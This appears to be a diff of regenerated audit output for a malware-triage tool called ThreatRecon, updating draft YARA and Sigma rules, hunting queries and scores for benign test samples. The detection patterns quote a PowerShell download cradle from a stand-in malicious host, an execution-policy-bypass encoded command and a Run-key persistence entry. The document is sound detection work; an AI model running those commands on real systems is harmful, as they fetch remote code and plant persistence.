@@ -69,7 +69,7 @@ Exports serialize real computed analyzer outputs, but narrative sections and rec
 - PASS: sample1 hash exact (abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789)
 - PASS: sample1 YARA references actual sample string (checked YARA strings)
 - PASS: sample1 Sigma references command or registry pattern (checked Sigma terms)
-- PASS: sample2 base64 decoded (Write-Output "AuditSample2"; whoami /all)
+- PASS: sample2 base64 decoded (Write-Output "AuditSample2"; whoami /all | Write-Output "AuditSample2"; whoami /all)
 - PASS: sample2 PowerShell MITRE (T1027.010, T1059.001, T1105, T1547.001, T1027, T1071)
 - PASS: sample3 entropy from byte content (5.842)
 - PASS: sample3 embedded strings extracted (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)r | MZ_AUDIT_SAMPLE_NOT_A_REAL_PE | VirtualAllocEx | WriteProcessMemory | CreateRemoteThread | http://example-malicious-test.com/bin | HKCU\Software\BinarySample\Run | powershell -enc SQBFAFgA | 0000000000000000000000000000000000000000000000000000000000000000)
@@ -1480,9 +1480,9 @@ rule ThreatRecon_Suspicious_Script {
     $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
     $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
     $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
-    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
+    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"" nocase // Registry strings
     $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
-    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
+    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=" nocase // PowerShell strings
   condition:
     3 of them
 }
@@ -1559,7 +1559,7 @@ tags:
   ],
   "detectionEngineering": {
     "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
-    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
+    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
     "splunk": [
       "index=* \"http://example-malicious-test.com/payload.ps1\"",
       "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
@@ -1641,9 +1641,9 @@ rule ThreatRecon_Suspicious_Script {
     $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
     $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
     $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
-    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
+    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"" nocase // Registry strings
     $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
-    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
+    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=" nocase // PowerShell strings
   condition:
     3 of them
 }
@@ -1716,14 +1716,14 @@ tags:
     "sha256": "ce779811ef591d617dd5154e21b10c650703ee354abd4818d64f540e1083e213"
   },
   "entropy": 5.295691098654294,
-  "score": 81,
+  "score": 85,
   "scoreBreakdown": {
-    "total": 81,
+    "total": 85,
     "beh": 50,
     "iocScore": 4,
     "yaraScore": 8,
     "entScore": 3,
-    "deobfScore": 4,
+    "deobfScore": 8,
     "capScore": 12
   },
   "verdict": "CRITICAL THREAT",
@@ -1990,7 +1990,7 @@ tags:
       "desc": "Registry-based persistence via Run key or Winlogon hijack"
     }
   ],
-  "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
+  "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
   "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
   "huntingQueries": [
     {
@@ -2026,7 +2026,7 @@ tags:
   ],
   "detectionEngineering": {
     "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"CurrentVersion\\\\\\\\Run\"\n      - \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"\n      - \"http://example-malicious-test.com/payload.ps1\"\n      - \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\"\n      - \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\"\n      - \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1547_001\n  - attack.t1105\n  - attack.t1027\n  - attack.t1071",
-    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powe\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
+    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"PowerShell execution policy bypass\" nocase // behavior\n    $s3 = \"Network download cradle — remote payload staging\" nocase // behavior\n    $s4 = \"Registry Run key modification — persistence\" nocase // behavior\n    $s5 = \"Large Base64 encoded blob — likely embedded payload\" nocase // behavior\n    $s6 = \"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" nocase // artifact\n    $s7 = \"C:\\\\Users\\\\Public\\\\audit-sample2.ps1\" nocase // artifact\n    $s8 = \"http://example-malicious-test.com/payload.ps1\" nocase // network\n    $s9 = \"Invoke-WebRequest -Uri \\\"http://example-malicious-test.com/payload.ps1\\\" -OutFile \\\"$env:TEMP\\\\payload.ps1\\\"\" nocase // Network indicators\n    $s10 = \"New-ItemProperty -Path \\\"HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\" -Name \\\"AuditSample2\\\" -Value \\\"powershell.exe -File C:\\\\Users\\\\Public\\\\audit-sample2.ps1\\\"\" nocase // Registry strings\n    $s11 = \"# ThreatRecon audit sample 2 - benign PowerShell text only\" nocase // PowerShell strings\n    $s12 = \"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=\" nocase // PowerShell strings\n  condition:\n    3 of them\n}",
     "splunk": [
       "index=* \"http://example-malicious-test.com/payload.ps1\"",
       "index=* \"# ThreatRecon audit sample 2 - benign PowerShell text only\"",
@@ -2119,6 +2119,11 @@ tags:
       "type": "PowerShell EncodedCommand",
       "raw": "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
       "decoded": "Write-Output \"AuditSample2\"; whoami /all"
+    },
+    {
+      "type": "Quoted base64 string literal",
+      "raw": "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=",
+      "decoded": "Write-Output \"AuditSample2\"; whoami /all"
     }
   ],
   "blocklist": [
@@ -2158,9 +2163,9 @@ rule ThreatRecon_Suspicious_Script {
     $s7 = "C:\\Users\\Public\\audit-sample2.ps1" nocase // artifact
     $s8 = "http://example-malicious-test.com/payload.ps1" nocase // network
     $s9 = "Invoke-WebRequest -Uri \"http://example-malicious-test.com/payload.ps1\" -OutFile \"$env:TEMP\\payload.ps1\"" nocase // Network indicators
-    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powe" nocase // Registry strings
+    $s10 = "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"AuditSample2\" -Value \"powershell.exe -File C:\\Users\\Public\\audit-sample2.ps1\"" nocase // Registry strings
     $s11 = "# ThreatRecon audit sample 2 - benign PowerShell text only" nocase // PowerShell strings
-    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAG" nocase // PowerShell strings
+    $s12 = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=" nocase // PowerShell strings
   condition:
     3 of them
 }
